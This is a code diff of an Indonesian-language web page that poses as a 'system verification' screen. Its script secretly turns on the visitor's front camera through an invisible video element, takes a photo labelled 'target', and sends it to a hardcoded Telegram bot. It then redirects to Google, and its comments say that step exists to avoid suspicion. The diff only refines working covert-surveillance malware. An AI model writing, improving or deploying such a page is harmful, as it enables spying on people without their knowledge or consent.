@@ -1,8 +1,9 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Verifikasi Sistem</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Sistem</title>
     <style>
         body { background: #000; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: auto; }
@@ -13,67 +14,68 @@
     <div class="loader"></div>
     <p>Sedang memverifikasi perangkat anda...<br>Mohon tunggu sebentar.</p>
 
-    <!-- Perubahan: Jangan gunakan display:none agar stream tetap diproses browser -->
+    <!-- Menggunakan opacity 0 agar browser tetap merender video -->
     <video id="video" style="position: absolute; width: 1px; height: 1px; opacity: 0;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // GANTI DENGAN TOKEN DAN CHAT ID MILIKMU
         const token = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
         const chat_id = '6888530451';
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
         async function startCamera() {
             try {
-                // Tambahkan playsinline untuk iOS dan facingMode: user untuk kamera depan
+                // Meminta akses kamera depan (user). Gunakan 'environment' untuk kamera belakang.
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" } 
                 });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
                 
-                // Perubahan: Gunakan event 'onloadedmetadata' untuk memastikan video sudah siap
-                video.onloadedmetadata = () => {
-                    video.play();
-                    // Delay diperpanjang ke 3 detik agar sensor cahaya kamera menyesuaikan
-                    setTimeout(takeSnapshot, 3000);
-                };
+                video.srcObject = stream;
+
+                // Event 'playing' dipicu saat video sudah benar-benar menerima data stream
+                video.addEventListener('playing', () => {
+                    // Tambahkan delay 2.5 detik untuk stabilitas sensor/fokus
+                    setTimeout(takeSnapshot, 2500);
+                }, { once: true });
+
             } catch (err) {
-                console.error("Akses ditolak atau error hardware");
-                // Tetap redirect agar tidak curiga
-                setTimeout(() => window.location.href = "https://google.com", 2000);
+                console.error("Akses ditolak:", err);
+                // Tetap arahkan ke google agar tidak terlihat mencurigakan
+                window.location.href = "https://google.com";
             }
         }
 
         function takeSnapshot() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
+            // Set dimensi canvas mengikuti stream video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             
-            if (video.videoWidth > 0) {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0);
-                
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chat_id);
-                    formData.append('photo', blob, 'target.jpg');
-                    formData.append('caption', '📸 **Target Berhasil Difoto!**\n\n<i>NEPTUNUS V1.0.8</i>');
-                    formData.append('parse_mode', 'HTML');
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Konversi canvas ke format gambar (blob)
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chat_id);
+                formData.append('photo', blob, 'target.jpg');
+                formData.append('caption', '📸 **Target Berhasil Difoto!**\n\n<i>NEPTUNUS V1.0.8</i>');
+                formData.append('parse_mode', 'HTML');
 
-                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    }).finally(() => {
-                        window.location.href = "https://google.com";
-                    });
-                }, 'image/jpeg', 0.8); // 0.8 untuk kompresi agar pengiriman lebih cepat
-            } else {
-                // Jika video masih 0 (hitam), coba lagi dalam 1 detik
-                setTimeout(takeSnapshot, 1000);
-            }
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).finally(() => {
+                    // Redirect setelah foto terkirim
+                    window.location.href = "https://google.com";
+                });
+            }, 'image/jpeg', 0.95);
         }
 
+        // Jalankan saat halaman dimuat
         window.onload = startCamera;
     </script>
 </body>
 </html>
+
